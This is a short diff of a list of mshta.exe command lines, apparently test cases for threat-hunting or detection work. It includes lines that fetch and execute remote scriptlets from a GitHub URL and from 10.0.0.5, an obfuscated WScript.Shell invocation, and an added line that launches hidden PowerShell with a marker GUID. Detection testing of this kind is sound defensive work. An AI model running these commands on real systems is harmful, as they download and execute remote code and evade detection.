@@ -7,3 +7,5 @@ mshta.exe vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(
 mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/PS1.sct')).Exec();close();
 
 mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
+
+mshta.exe "javascript:a=new ActiveXObject("WScript.Shell");a.Run("powershell.exe%20-nop%20-Command%20Write-Host%20f83a289e-8218-459c-9ddb-ccd3b72c732a;%20Start-Sleep%20-Seconds%202;%20exit",0,true);close();"
